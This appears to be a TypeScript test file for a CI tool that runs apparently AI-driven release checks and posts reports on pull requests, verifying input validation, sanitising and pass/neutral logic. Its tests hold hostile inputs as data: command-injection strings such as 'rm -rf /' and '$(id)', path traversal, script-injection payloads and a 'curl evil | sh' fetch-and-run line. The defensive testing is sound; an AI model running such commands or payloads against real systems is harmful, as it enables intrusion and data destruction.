import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import { appsTouched } from "../src/ci/build.ts";
import { render, ReportInput, safe } from "../src/ci/report.ts";
import { canRetest, driverChoice, Meta, tighten } from "../src/ci/run.ts";
import { planToDraft } from "../src/drivers/recorded.ts";
import { PlanDraft, type RunReport } from "../src/schema.ts";

const recording = async () =>
  JSON.parse(await readFile(new URL("../../../eval/recordings/NWG-342.json", import.meta.url), "utf8")) as RunReport;
const RUN_URL = "https://github.com/acme/widgets/actions/runs/123";

test("which application a pull request touches is decided by the nearest manifest", () => {
  const manifests = new Set(["apps/one", "apps/two", "."]);
  const has = (dir: string) => manifests.has(dir);
  assert.deepEqual(appsTouched(["apps/one/src/a.ts", "apps/one/README.md"], has), ["apps/one"]);
  assert.deepEqual(appsTouched(["apps/one/a.ts", "apps/two/b/c.ts"], has), ["apps/one", "apps/two"]);
  assert.deepEqual(appsTouched(["docs/x.md"], has), ["."]);
  assert.deepEqual(appsTouched(["docs/x.md"], () => false), []);
});

test("the build stage's description is checked field by field", () => {
  const sha = "a".repeat(40);
  assert.ok(Meta.safeParse({ pr: 7, headSha: sha, appDir: "apps/one" }).success);
  for (const bad of [
    { pr: 7, headSha: "abc" },
    { pr: -1, headSha: sha },
    { pr: 7, headSha: sha, appDir: "../../etc" },
    { pr: 7, headSha: sha, appDir: "/etc" },
    { pr: 7, headSha: sha, appDir: "apps/$(id)" },
    { pr: "7; rm -rf /", headSha: sha },
  ]) {
    assert.equal(Meta.safeParse(bad).success, false, JSON.stringify(bad));
  }
});

test("untrusted text cannot carry markup, mentions or links into a comment", () => {
  const out = safe('<img src=x onerror=1> @octocat [click](https://evil.example) `code`\n| a | **b**');
  assert.doesNotMatch(out, /<img|\n/);
  assert.doesNotMatch(out, /@octocat/);
  assert.doesNotMatch(out, /\]\(https:\/\//);
  assert.match(out, /&lt;img/);
  assert.equal(safe("x".repeat(500), 50).length, 51);
});

test("a completed run renders with failures first and a failing conclusion", async () => {
  const run = await recording();
  run.executionMode = "autonomous";
  run.results[0]!.verdict = "failed";
  run.results[0]!.assertionResults[0]!.pass = false;
  const input = ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run });
  const out = render(input, RUN_URL);
  assert.equal(out.conclusion, "failure");
  assert.match(out.title, /^1 failed, \d+ passed, \d+ not verified \(autonomous\)$/);
  assert.match(out.body, /Execution mode: autonomous/);
  assert.match(out.body, /^<!-- releaseproof-report -->/);
  assert.match(out.body, /### Failures/);
  assert.match(out.body, /Requirement R\d+: "/);
  assert.ok(out.body.length < 60_100);
});

test("blocked or unverified scenarios make the result neutral, never a pass", async () => {
  const run = await recording();
  run.executionMode = "autonomous";
  assert.equal(render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run }), RUN_URL).conclusion, "success");
  run.results[1]!.verdict = "unverified";
  run.results[1]!.reason = "Not executed: the run's cost limit of $8 reached.";
  const out = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run }), RUN_URL);
  assert.equal(out.conclusion, "neutral");
  assert.match(out.body, /### Not verified/);
});

test("hostile content in a result is displayed as text", async () => {
  const run = await recording();
  run.ticketKey = "X-1 <script>alert(1)</script>";
  run.results[0]!.title = "@everyone see [this](https://evil.example/steal)";
  run.results[0]!.verdict = "failed";
  run.results[0]!.assertionResults[0]!.actual = "`; curl evil | sh";
  run.results[0]!.assertionResults[0]!.pass = false;
  const out = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run }), "javascript:alert(1)");
  assert.doesNotMatch(out.body, /<script>|@everyone|\]\(https:\/\/evil|javascript:/);
});

test("skipped and failed runs are neutral and give their reason", () => {
  const out = render(ReportInput.parse({ status: "skipped", repo: "acme/widgets", reason: "No ticket ABC-1 is available to this run." }), RUN_URL);
  assert.equal(out.conclusion, "neutral");
  assert.match(out.body, /No ticket ABC-1/);
  assert.throws(() => ReportInput.parse({ status: "completed", repo: "not a repo" }));
});

test("a recorded plan converts back to the shape a model would return", async () => {
  const run = await recording();
  const draft = PlanDraft.parse(planToDraft(run.plan));
  assert.equal(draft.scenarios.length, run.plan.scenarios.length);
  const first = draft.scenarios.find((s) => s.assertions.length > 0)!;
  assert.ok(first.assertions.every((a) => a.requirementId));
});

test("a run without a live model is never green and says what it is", async () => {
  const allPassed = await recording();
  for (const mode of ["recorded", undefined] as const) {
    allPassed.executionMode = mode;
    assert.ok(allPassed.results.every((r) => r.verdict === "passed"));
    const out = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run: allPassed }), RUN_URL);
    assert.equal(out.conclusion, "neutral", String(mode));
    assert.match(out.title, /^Recorded replay, not an autonomous run: 0 failed, 9 passed/);
    assert.match(out.body, /\*\*Recorded replay, not an autonomous run\.\*\* No live model was used/);
    assert.match(out.body, /Execution mode: recorded/);
  }
  // Even a failing recorded run stays neutral; the failure is still listed.
  allPassed.executionMode = "recorded";
  allPassed.results[0]!.verdict = "failed";
  allPassed.results[0]!.assertionResults[0]!.pass = false;
  const failing = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run: allPassed }), RUN_URL);
  assert.equal(failing.conclusion, "neutral");
  assert.match(failing.body, /### Failures/);
  // A re-run by replay of an autonomous run is labelled as replay and can pass.
  const replay = await recording();
  replay.executionMode = "replay";
  const replayed = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run: replay }), RUN_URL);
  assert.equal(replayed.conclusion, "success");
  assert.match(replayed.title, /\(replay\)$/);
});

test("a requested limit can lower a run's budget but never raise it", () => {
  const base = { limits: { maxUsd: 8, maxTokens: 3_000_000, maxMinutes: 25 }, maxScenarios: 10 };
  assert.deepEqual(tighten(base, { maxUsd: "2.5", maxScenarios: "4", maxMinutes: "15" }), {
    limits: { maxUsd: 2.5, maxTokens: 3_000_000, maxMinutes: 15 },
    maxScenarios: 4,
    disableFallbacks: false,
  });
  assert.deepEqual(tighten(base, { maxUsd: "500", maxScenarios: "99", maxMinutes: "600", maxTokens: "9e12" }).limits, base.limits);
  assert.equal(tighten(base, { maxScenarios: "99" }).maxScenarios, 10);
  for (const junk of [null, "x", [], { maxUsd: "-1" }, { maxUsd: "$(id)" }, { maxScenarios: "1.5" }, { maxUsd: {} }]) {
    assert.deepEqual(tighten(base, junk).limits, base.limits, JSON.stringify(junk));
    assert.equal(tighten(base, junk).maxScenarios, 10);
  }
  assert.equal(tighten(base, { disableFallbacks: "true" }).disableFallbacks, true);
  assert.equal(tighten(base, { disableFallbacks: "yes" }).disableFallbacks, false);
});

test("the live driver is chosen whenever a key is configured, the recording only without one", () => {
  assert.equal(driverChoice("sk-test", true), "live");
  assert.equal(driverChoice("sk-test", false), "live");
  assert.equal(driverChoice("", true), "recorded");
  assert.equal(driverChoice("   ", true), "recorded");
  assert.equal(driverChoice(undefined, true), "recorded");
  assert.equal(driverChoice(undefined, false), "none");
});

test("only a run produced by a live model can be re-run on a later commit", async () => {
  const previous = await recording();
  const hash = "h";
  previous.ticketHash = hash;
  previous.pullRequest.number = 1;
  for (const [mode, expected] of [["autonomous", true], ["replay", true], ["recorded", false], [undefined, false]] as const) {
    previous.executionMode = mode;
    assert.equal(canRetest(previous, 1, hash, false), expected, String(mode));
  }
  previous.executionMode = "autonomous";
  assert.equal(canRetest(previous, 1, hash, true), false, "a full run was asked for");
  assert.equal(canRetest(previous, 2, hash, false), false, "another pull request");
  assert.equal(canRetest(previous, 1, "changed", false), false, "the ticket changed");
  assert.equal(canRetest(undefined, 1, hash, false), false);
});
